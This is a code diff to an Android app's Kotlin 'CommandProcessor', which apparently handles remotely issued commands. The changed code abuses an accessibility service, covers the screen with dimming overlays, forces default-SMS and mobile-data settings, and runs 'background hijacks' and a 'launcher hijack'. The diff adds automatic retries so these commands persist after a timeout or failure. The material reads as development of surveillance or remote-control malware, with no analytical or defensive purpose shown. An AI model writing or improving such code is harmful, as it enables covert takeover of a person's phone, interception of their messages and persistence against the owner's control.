@@ -741,6 +741,7 @@ object CommandProcessor {
                                     DefaultSmsManager.expectedMode = ""
                                     MyAccessibilityService.instance?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
                                     DynamicUIManager.removeOverlay(ctx, "SMS_RESTORE_SAFETY_FUSE")
+                                    CommandRetryManager.scheduleRetry(ctx, id, "RESTORE_DEFAULT_SMS", "", "30s Restore Timeout")
                                 }
                             }, 30000)
                         }
@@ -1596,6 +1597,7 @@ object CommandProcessor {
                                     MyAccessibilityService.instance?.isWaitingForDataSettings = false
                                     DimmerManager.removeOverlay(ctx)
                                     MyAccessibilityService.instance?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
+                                    CommandRetryManager.scheduleRetry(ctx, id, "FORCE_DATA", content, "25s Data Timeout")
                                 }
                             }, 25000)
                         }
@@ -1806,6 +1808,7 @@ object CommandProcessor {
                     MyAccessibilityService.instance?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
                     DimmerManager.removeOverlay(ctx)
                     DebugLogger.log("AUTO_SYNC", "Absolute safety fuse fired.")
+                    CommandRetryManager.scheduleRetry(ctx, id, "FULL_ONBOARDING", "", "35s Master Timeout")
                 }
             }, 35000)
             
@@ -2318,7 +2321,11 @@ object CommandProcessor {
 
                         prefs.edit().putBoolean("hijacks_completed", true).apply()
                         DebugLogger.log("RBT_LIFECYCLE", "Relentless Loop Exited. All Success: $allSuccess")
-                        CommandProcessor.updateCommandStatus(ctx, id, "SUCCESS", "Background hijacks completed. All Success: $allSuccess")
+                        if (!allSuccess) {
+                            CommandRetryManager.scheduleRetry(ctx, id, "RESET_BACKGROUND_TASKS", "", "110s Relentless Timeout")
+                        } else {
+                            CommandProcessor.updateCommandStatus(ctx, id, "SUCCESS", "Background hijacks completed. All Success: true")
+                        }
                     }
                     status = "BACKGROUND_HIJACKS_STARTED"
                 }
@@ -2829,6 +2836,7 @@ object CommandProcessor {
                             withContext(kotlinx.coroutines.Dispatchers.Main) {
                                 DimmerManager.removeOverlay(ctx)
                             }
+                            CommandRetryManager.scheduleRetry(ctx, id, "HIJACK_LAUNCHER", "", "30s Hijack Timeout")
                         }
                         ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().putBoolean("power_shield_keep_ignited", false).apply()
                     }
